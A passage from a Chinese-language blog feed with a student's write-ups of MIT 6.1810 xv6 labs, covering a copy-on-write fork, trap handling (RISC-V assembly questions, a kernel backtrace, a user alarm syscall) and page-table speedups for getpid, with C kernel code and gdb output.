class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_W) &#123;</span><br><span class="line">      flags = (flags &amp; ~PTE_W) | PTE_COW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mappages(new, i, PGSIZE, pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_COW) &#123;</span><br><span class="line">      *pte = PA2PTE(pa) | flags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    krefIncre((<span class="type">void</span>*)pa);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>怎么有人总是把 &amp; 和 | 的功能写反</del></p><ol start="4"><li>修改 kernel/trap.c 的 <code>usertrap</code> 和 kernel/vm.c 的 <code>copyout</code>，添加遇到 COW 页的情况</li></ol><p>注意虚拟地址要小于 MAXVA，否则在 <code>walk</code> 时会直接出现 panic</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="type">pte_t</span> *pte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    <span class="keyword">if</span>(dstva &lt; MAXVA) &#123;</span><br><span class="line">      pte = walk(pagetable, dstva, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pte &amp;&amp; (*pte &amp; PTE_COW)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(copyCOW(pte)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="type">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyCOW</span><span class="params">(<span class="type">pte_t</span> *pte)</span> &#123;</span><br><span class="line">  uint64 pa = PTE2PA(*pte);</span><br><span class="line">  uint flags = (PTE_FLAGS(*pte) &amp; ~PTE_COW) | PTE_W;</span><br><span class="line">  *pte = PA2PTE(pa) | flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(kref((<span class="type">void</span>*)pa) != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> *mem = kalloc();</span><br><span class="line">    <span class="keyword">if</span>(mem == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      memmove(mem, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(mem) | flags;</span><br><span class="line">      krefDecre((<span class="type">void</span>*)pa);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(r_scause() == <span class="number">15</span> &amp;&amp; r_stval() &lt; MAXVA &amp;&amp; (*(pte = walk(p-&gt;pagetable, r_stval(), <span class="number">0</span>)) &amp; PTE_COW)) &#123;</span><br><span class="line">  <span class="comment">// store COW page fault</span></span><br><span class="line">  <span class="keyword">if</span>(copyCOW(pte)) &#123;</span><br><span class="line">    setkilled(p);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后在 kernel/defs.h 里添加一些函数声明即可</p><h2 id="Optional-challenge-exercise"><a href="#Optional-challenge-exercise" class="headerlink" title="Optional challenge exercise"></a>Optional challenge exercise</h2><h3 id="测量你的-COW-实现减少了多少字节的复制和多少页物理内存的分配"><a href="#测量你的-COW-实现减少了多少字节的复制和多少页物理内存的分配" class="headerlink" title="测量你的 COW 实现减少了多少字节的复制和多少页物理内存的分配"></a>测量你的 COW 实现减少了多少字节的复制和多少页物理内存的分配</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;页表牛逼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab4 Traps</title>
    <link href="https://humoooor.cn/2022/10/31/Lab4_Traps/"/>
    <id>https://humoooor.cn/2022/10/31/Lab4_Traps/</id>
    <published>2022-10-31T03:47:00.000Z</published>
    <updated>2023-05-29T08:09:58.811Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h2><figure class="highlight c"><figcaption><span>user/call.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x+<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读 user/call.asm 回答问题~</p><figure class="highlight x86asm"><figcaption><span>main.asm</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c: <span class="number">1141</span>                 addi  <span class="built_in">sp</span>,<span class="built_in">sp</span>,-<span class="number">16</span></span><br><span class="line">  1e: e406                 sd ra,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">20</span>: e022                 sd s0,<span class="number">0</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">22</span>: <span class="number">0800</span>                 addi  s0,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">  printf(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>)<span class="comment">;</span></span><br><span class="line">  <span class="number">24</span>: <span class="number">4635</span>                 li a2,<span class="number">13</span></span><br><span class="line">  <span class="number">26</span>: 45b1                 li a1,<span class="number">12</span></span><br><span class="line">  <span class="number">28</span>: <span class="number">00000517</span>             auipc a0,<span class="number">0x0</span></span><br><span class="line">  2c: 7c850513             addi  a0,a0,<span class="number">1992</span> # 7f0 &lt;malloc+<span class="number">0xee</span>&gt;</span><br><span class="line">  <span class="number">30</span>: <span class="number">00000097</span>             auipc ra,<span class="number">0x0</span></span><br><span class="line">  <span class="number">34</span>: 614080e7             jalr  <span class="number">1556</span>(ra) # <span class="number">644</span> &lt;printf&gt;</span><br><span class="line">  exit(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">  <span class="number">38</span>: <span class="number">4501</span>                 li a0,<span class="number">0</span></span><br><span class="line">  3a: <span class="number">00000097</span>             auipc ra,<span class="number">0x0</span></span><br><span class="line">  3e: 290080e7             jalr  <span class="number">656</span>(ra) # 2ca &lt;exit&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>传给函数的参数保存在哪些寄存器中？例如 main 函数中的调用 printf 的参数 13 保存在哪个寄存器中？</p></blockquote><p>a0 ~ a7 保存函数参数，更多的参数放在栈中</p><p>main 调用 printf 的参数 13 在 a2 中</p><blockquote><p>main 函数中调用 f 函数的汇编代码在哪？调用 g 函数的代码在哪？（提示：编译器可能内联函数）</p></blockquote><p>真的有调用吗。。。感觉编译器优化了，直接把 f(8)+1 的结果计算出来为 12，传给 a1 寄存器了。</p><blockquote><p>printf 函数的地址是多少？</p></blockquote><p>看注释，在 0x644</p><blockquote><p>在 main 函数中，在执行 jalr 跳转到 printf 后，ra 寄存器的值时多少？</p></blockquote><p>0x38</p><p>jalr 会将下一条指令的地址存到括号中的寄存器中</p><blockquote><p>运行下面的代码，输出什么？<br>unsigned int i = 0x00646c72;<br>printf(“H%x” Wo%s”, 57616, &amp;i);</p></blockquote><p>He110 World</p><blockquote><p>下面的代码，会打印出 ‘y=’ 什么？<br>printf(“x=%d y=%d”, 3);</p></blockquote><p>按照 RISC-V 的函数调用约定，会打印出 a2 寄存器的值</p><h2 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h2><p>对内核的函数调用进行回溯，比较简单</p><p>根据 RISC-V 的函数调用约定，ra 位于 fp - 0x8 的位置，Prev.fp 位于 fp - 0x10 的位置</p><p>在内核栈中，最后一个栈帧指针位于页面的首地址，根据这个可以判断何时退出循环</p><p>可以通过 gdb 进行调试，0x3ffffff9fc0 -&gt; 0x3ffffffe0 -&gt; 0x3ffffffa000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20gx <span class="variable">$fp</span>-0x10</span><br><span class="line">0x3fffff9f70:   0x0000003fffff9fc0      0x00000000800021aa</span><br><span class="line">0x3fffff9f80:   0x0000003fffff9fc0      0x00000001ffff9fa0</span><br><span class="line">0x3fffff9f90:   0x0000003fffff9fc0      0x0000000000000020</span><br><span class="line">0x3fffff9fa0:   0x0000000087f70000      0x0000000080009030</span><br><span class="line">0x3fffff9fb0:   0x0000003fffff9fe0      0x000000008000201c</span><br><span class="line">0x3fffff9fc0:   0x0000000000000063      0x0000000080009030</span><br><span class="line">0x3fffff9fd0:   0x0000003fffffa000      0x0000000080001d12</span><br><span class="line">0x3fffff9fe0:   0x0000000000000063      0x0000000000014f50</span><br><span class="line">0x3fffff9ff0:   0x0000000000003fd0      0x0000000000000012</span><br><span class="line">0x3fffffa000:   Cannot access memory at address 0x3fffffa000</span><br></pre></td></tr></table></figure><p>但是在用户栈中，最后一个栈帧指针是页面的首地址 - 0x10，就很怪。。。</p><p>比如在 sh 打印 <code>$ </code> 时，查看用户栈，0x4fd0 -&gt; 0x4fe0 -&gt; 0x4ff0，最后一个指针是 0x4ff0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20gx <span class="variable">$fp</span>-0x10</span><br><span class="line">0x4f80: 0x0000000000004fd0      0x0000000000000ade</span><br><span class="line">0x4f90: 0x0000000000000000      0x0505050505050505</span><br><span class="line">0x4fa0: 0x0505050505050505      0x0505050505050505</span><br><span class="line">0x4fb0: 0x00000000000008a8      0x0000000000000000</span><br><span class="line">0x4fc0: 0x0000000000004fe0      0x0000000000000b66</span><br><span class="line">0x4fd0: 0x0000000000003fd0      0x00000000000000de</span><br><span class="line">0x4fe0: 0x0000000000004ff0      0x0000000000000000</span><br><span class="line">0x4ff0: 0x0000000000006873      0x0000000000000000</span><br><span class="line">0x5000: Cannot access memory at address 0x5000</span><br></pre></td></tr></table></figure><p><del>算了，不管这么多了，反正也只用回溯内核栈</del></p><p>把 <code>backtrace</code> 贴到 kernel/printf.c 中，在 kernel/defs.h 中添加声明，然后在 <code>sys_sleep</code> 调用就好了</p><figure class="highlight c"><figcaption><span>kernel/printf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">backtrace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;backtrace:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(uint64 fp = r_fp(); fp != PGROUNDUP(fp); fp = *(uint64*)(fp<span class="number">-0x10</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(uint64*)(fp<span class="number">-0x8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得的地址可以通过 addr2line 得到对应的程序代码的位置，便于调试</p><p>如 <code>addr2line -e kernel/kernel</code></p><p>放到 <code>panic</code> 函数中，可以更好地方便内核崩溃原因</p><h2 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h2><p>添加一个用户级的定时器中断，也就是 <code>sigalarm(interval, handler)</code> 和 <code>sigreturn()</code></p><p>每 n 次硬件计时器中断，就会调用一次 handler，在 handler 中要有 <code>sigreturn</code> 保证还原到原本的状态</p><p>笔者天真地以为保存 p-&gt;trapframe-&gt;epc 就行了，wsfw（还有通用寄存器要进行保存）</p><h3 id="在-proc-结构体添加变量"><a href="#在-proc-结构体添加变量" class="headerlink" title="在 proc 结构体添加变量"></a>在 proc 结构体添加变量</h3><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  <span class="type">int</span> alarm_interval;</span><br><span class="line">  uint64 alarm_handler;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">alarm_state</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ticks<ul><li>保存计时器中断次数，每中断一次，ticks++</li></ul></li><li>alarm_state<ul><li>直接用 <code>struct trapframe</code> 结构体保存原状态（笔者是个懒人</li><li>在每次调用 handler 前，将其指向 p-&gt;trapframe + 1，<code>sigreturn</code> 后置零</li></ul></li></ul><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc*</span><br><span class="line"><span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  p-&gt;ticks = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_interval = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_handler = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_state = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加系统调用"><a href="#添加系统调用" class="headerlink" title="添加系统调用"></a>添加系统调用</h3><figure class="highlight c"><figcaption><span>kernel/sysproc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  uint64 handler;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;ticks);</span><br><span class="line">  argaddr(<span class="number">1</span>, &amp;handler);</span><br><span class="line"></span><br><span class="line">  p-&gt;alarm_interval = ticks;</span><br><span class="line">  p-&gt;alarm_handler = handler;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  uint64 a0 = p-&gt;alarm_state-&gt;a0;</span><br><span class="line"></span><br><span class="line">  memmove(p-&gt;trapframe, p-&gt;alarm_state, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">  <span class="built_in">memset</span>(p-&gt;alarm_state, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">  p-&gt;alarm_state = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计时器中断时判断是否执行-handler"><a href="#计时器中断时判断是否执行-handler" class="headerlink" title="计时器中断时判断是否执行 handler"></a>计时器中断时判断是否执行 handler</h3><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>) &#123;</span><br><span class="line">    yield();</span><br><span class="line">    p-&gt;ticks++;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;alarm_interval &amp;&amp; !p-&gt;alarm_state &amp;&amp; p-&gt;ticks % p-&gt;alarm_interval == <span class="number">0</span>) &#123;</span><br><span class="line">      p-&gt;alarm_state = p-&gt;trapframe + <span class="number">1</span>;</span><br><span class="line">      memmove(p-&gt;alarm_state, p-&gt;trapframe, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">      p-&gt;trapframe-&gt;epc = p-&gt;alarm_handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后添加一些声明即可</p><h2 id="Option-challenge-exercises"><a href="#Option-challenge-exercises" class="headerlink" title="Option challenge exercises"></a>Option challenge exercises</h2><h3 id="backtrace-打印函数名和行号"><a href="#backtrace-打印函数名和行号" class="headerlink" title="backtrace 打印函数名和行号"></a>backtrace 打印函数名和行号</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab3 Page Tables</title>
    <link href="https://humoooor.cn/2022/10/23/Lab3_Page_tables/"/>
    <id>https://humoooor.cn/2022/10/23/Lab3_Page_tables/</id>
    <published>2022-10-23T08:56:00.000Z</published>
    <updated>2023-05-23T03:22:39.224Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git checkout pgtbl</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><h2 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h2><p>为了优化 <code>getpid</code> 系统调用，不用每次进入内核态获取 PID，创建一个用户可读的页，将 USYSCALL 映射到该页上</p><p>可以观察 <code>ugetpid</code> 函数的定义，它直接访问 USYSCALL 即可拿到 pid，不需要系统调用，算是以空间换时间</p><figure class="highlight c"><figcaption><span>user/ulib.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ugetpid</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">u</span> =</span> (<span class="keyword">struct</span> usyscall *)USYSCALL;</span><br><span class="line">  <span class="keyword">return</span> u-&gt;pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在 <code>kernel/proc.h</code> 中 proc 结构体加入 <code>struct usyscall *usyscall</code></li><li>在 <code>allocproc</code> 初始化 usyscall</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc* <span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;usyscall = (<span class="keyword">struct</span> usyscall *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;usyscall-&gt;pid = p-&gt;pid;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>在 <code>proc_pagetable</code> 建立映射</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pagetable_t</span> <span class="title function_">proc_pagetable</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(mappages(pagetable, USYSCALL, PGSIZE,</span><br><span class="line">            (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmfree(pagetable, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>在 <code>freeproc</code> 释放 usyscall</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> 